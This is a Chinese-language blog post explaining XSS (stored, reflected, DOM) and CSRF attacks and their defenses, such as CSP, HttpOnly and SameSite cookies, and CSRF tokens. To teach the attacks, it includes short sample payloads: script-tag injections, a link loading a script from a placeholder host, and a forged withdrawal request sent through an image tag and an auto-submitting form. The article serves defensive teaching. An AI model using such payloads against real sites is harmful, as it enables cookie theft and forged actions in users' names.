<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="BK201-Drama">





<title>前端安全相关——XSS攻击与CSRF攻击 | BK201-Drama</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 5.4.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">⬅ home page</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">⬅ home page</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">前端安全相关——XSS攻击与CSRF攻击</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">BK201-Drama</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">十二月 18, 2021&nbsp;&nbsp;00:00:00</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h1><h2 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h2><p>Cross-Site Scripting【跨站脚本攻击】简称XSS，是一种代码注入攻击。攻击者通过在目标网站上<strong>注入恶意脚本</strong>，使之在用户的浏览器上面运行，利用这些脚本，攻击者可以获取用户的敏感信息，比如Cookies，SessionID等，进而危害数据安全</p>
<h2 id="XSS本质"><a href="#XSS本质" class="headerlink" title="XSS本质"></a>XSS本质</h2><p>XSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。</p>
<h2 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h2><p>存储型、反射型、DOM型</p>
<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><ul>
<li>将恶意代码提交到目标网站的数据库中</li>
<li>用户打开网站时，恶意代码被数据库取出，渲染到页面被拼接</li>
<li>用户接收到响应后解析执行，混在其中的恶意代码也被执行</li>
<li>窃取用户数据，此时就可冒充用户</li>
</ul>
<p>这种攻击常见于带有用户保存数据的网站功能，比如论坛，评论和私信</p>
<p>一个例子：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;“&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">&lt;!-- 我输入 “&gt;&lt;script&gt;alert(&quot;</span><span class="attr">XSS</span>攻击你一次&quot;)&lt;/<span class="attr">script</span>&gt;</span> 你傻了吧? --&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot; “&gt;&lt;script&gt;alert(&quot;</span>攻击你一次&quot;)&lt;/<span class="attr">script</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>



<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><ul>
<li>攻击者构造出特殊的URL，其中包含恶意代码</li>
<li>用户打开带有恶意代码的URL时，网站服务端会将恶意代码从URL中取出，拼接在HTML中返回给浏览器</li>
<li>用户浏览器收到响应后转义HTML，此时恶意代码也被混入</li>
<li>恶意代码此时会窃取用户数据</li>
</ul>
<p>这种攻击常见于网站搜索和跳转链接中</p>
<p>由于需要用户主动打开恶意的URL才能生效，攻击者会结合多种手段诱导点击</p>
<p>POST内容也可以触发反射型XSS，不过条件苛刻</p>
<p>一个例子：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 攻击者设计的诱导链接 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://weibo.com/pub/star/g/xyyyd&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//xxxx.cn/image/t.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;点我<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- http://weibo.com/pub/star/g/xyyyd&quot;链接被破坏 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 浏览器接收到响应后就会加载执行恶意脚本 //xxxx.cn/image/t.js --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://weibo.com/pub/star/g/xyyyd&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//xxxx.cn/image/t.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;按分类检索<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><ul>
<li>攻击者构造出特殊的URL，其中包含恶意代码</li>
<li>用户打开带有恶意代码的URL</li>
<li>用户浏览器接收到响应后解析执行，前端JS取出URL中的恶意代码并执行</li>
<li>恶意代码此时会窃取用户数据</li>
</ul>
<p><strong>DOM型的XSS和前面两种XSS的区别</strong>：DOM型XSS攻击中，取出和执行恶意代码由浏览器端完成，属于前端JS自身的安全漏洞，而其他两种属于服务器端的安全漏洞</p>
<p><strong>注意事项</strong></p>
<ul>
<li><p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code> 等。</p>
</li>
<li><p>如果用 Vue/React 技术栈，并且不使用 <code>v-html</code>/<code>dangerouslySetInnerHTML</code> 功能，就在前端 render 阶段避免 <code>innerHTML</code>、<code>outerHTML</code> 的 XSS 隐患。</p>
</li>
</ul>
<h2 id="通常的注入方法"><a href="#通常的注入方法" class="headerlink" title="通常的注入方法"></a>通常的注入方法</h2><ul>
<li><p>在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。</p>
</li>
<li><p>在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</p>
</li>
<li><p>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</p>
</li>
<li><p>在标签的 href、src 等属性中，包含 <code>javascript:</code> 等可执行代码。</p>
</li>
<li><p>在 onload、onerror、onclick 等事件中，注入不受控制代码。</p>
</li>
<li><p>在 style 属性和标签中，包含类似 <code>background-image:url(&quot;javascript:...&quot;);</code> 的代码（新版本浏览器已经可以防范）。</p>
</li>
<li><p>在 style 属性和标签中，包含类似 <code>expression(...)</code> 的 CSS 表达式代码（新版本浏览器已经可以防范）。</p>
</li>
</ul>
<h2 id="一些措施"><a href="#一些措施" class="headerlink" title="一些措施"></a>一些措施</h2><ul>
<li>CSP</li>
<li>输入内容长度控制【不能完全阻止XSS注入，但能增加难度】</li>
<li>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。</li>
<li>验证码：防止脚本冒充用户提交危险操作。</li>
</ul>
<h1 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h1><h2 id="什么是CSRF"><a href="#什么是CSRF" class="headerlink" title="什么是CSRF"></a>什么是CSRF</h2><p>CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的</p>
<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><ul>
<li>受害者登录着a.com，并且保留着登录凭证Cookies</li>
<li>攻击者诱导受害者访问b.com</li>
<li>b.com对a.com发送请求：a.com/act=xx</li>
<li>a.com接收请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者发出的请求</li>
<li>a.com以受害者的名义执行了act=xx</li>
<li>攻击完成，以窃取用户登录信息</li>
</ul>
<h2 id="CSRF分类"><a href="#CSRF分类" class="headerlink" title="CSRF分类"></a>CSRF分类</h2><h3 id="GET类型"><a href="#GET类型" class="headerlink" title="GET类型"></a>GET类型</h3><p>较为简单，只需要一个HTTP请求</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://bank.example/withdraw?amount=10000&amp;for=hacker&quot;</span> &gt;</span> </span><br></pre></td></tr></table></figure>

<p>受害者访问到了带有这个图片的页面后，浏览器会自动向<code>http://bank.example/withdraw?amount=10000&amp;for=hacker</code>发出一次HTTP请求，<code>bank.example</code>就会收到包含受害者登录信息的一次跨域请求</p>
<h3 id="POST类型"><a href="#POST类型" class="headerlink" title="POST类型"></a>POST类型</h3><p>通常使用表单，自动获取用户数据并自动提交用户敏感信息</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://bank.example/withdraw&quot;</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;account&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xiaoming&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10000&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;for&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> <span class="built_in">document</span>.forms[<span class="number">0</span>].submit(); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问该页面后，就会提交表单【与此同时你根本看不到这些元素，不知道信息被窃取】</p>
<p><strong>因此后端接口不能将安全寄托在仅允许POST上面</strong></p>
<h3 id="链接类型"><a href="#链接类型" class="headerlink" title="链接类型"></a>链接类型</h3><p>需要用户点击恶意链接、恶意图片才会触发</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker&quot;</span> <span class="attr">taget</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于用户登录了信任的网站A，并且保存登录状态，只要用户点击主动访问上面的页面，则表示攻击成功</p>
<h2 id="CSRF攻击特点"><a href="#CSRF攻击特点" class="headerlink" title="CSRF攻击特点"></a>CSRF攻击特点</h2><ul>
<li>攻击一般发起在第三方网站，因此被攻击的网站无法防止攻击发生</li>
<li>攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作，而并非直接窃取数据</li>
<li>整个过程攻击者并不能获取到受害者的登录凭证，而只是冒用</li>
<li>跨站请求可以使用各种方式，比如图片URL，超链接，CORS，Form提交等。部分请求方式可以直接嵌入在第三方的论坛和文章中，难以进行追踪</li>
</ul>
<p>CSRF通常为跨域的，因为外域更容易被攻击者掌控；但是本域下有容易被利用的功能，比如可以发图片链接，则攻击可以直接在本域下进行，并且攻击更加危险。</p>
<p>攻击者无法直接窃取到用户的信息（Cookie，Header，网站内容等），仅仅是冒用Cookie中的信息。</p>
<h2 id="防护策略"><a href="#防护策略" class="headerlink" title="防护策略"></a>防护策略</h2><p>只能增加自己网站针对CSRF的防护能力和本域CSRF攻击的预防能力</p>
<h3 id="增加防护能力"><a href="#增加防护能力" class="headerlink" title="增加防护能力"></a>增加防护能力</h3><ul>
<li>阻止不明外域的访问<ul>
<li>同源检测</li>
<li>Samesite Cookies</li>
</ul>
</li>
<li>提交时要求附加本域才能获取的信息<ul>
<li>CSRF Token</li>
<li>双重Cookies验证：要求AJAX和表单请求携带一个Cookies【这个Cookies用来安全认证，另一个用来保存个人信息】</li>
</ul>
</li>
</ul>
<h3 id="增加预防能力"><a href="#增加预防能力" class="headerlink" title="增加预防能力"></a>增加预防能力</h3><ul>
<li>严格管理所有的上传接口，防止任何预期之外的上传内容</li>
<li>添加Header<code>X-Content-Type-Options: nosniff</code>防止黑客上传HTML内容的资源被解析成网页</li>
<li>对于用户上传的图片进行转存或者校验，不要直接使用用户填写的图片链接</li>
<li>打开其他链接时，提前告知打开有风险</li>
</ul>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>BK201-Drama</span>
                    </p>
                
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Do you believe in <strong>DESTINY</strong>?</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/%E5%AE%89%E5%85%A8/"># 安全</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2021/12/21/webpack/">webpack笔记</a>
            
            
            <a class="next" rel="next" href="/2021/12/16/web%E6%96%87%E4%BB%B6%E7%9A%84app%E6%89%93%E5%8C%85/">如何开发一个web app呢？</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© BK201-Drama | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>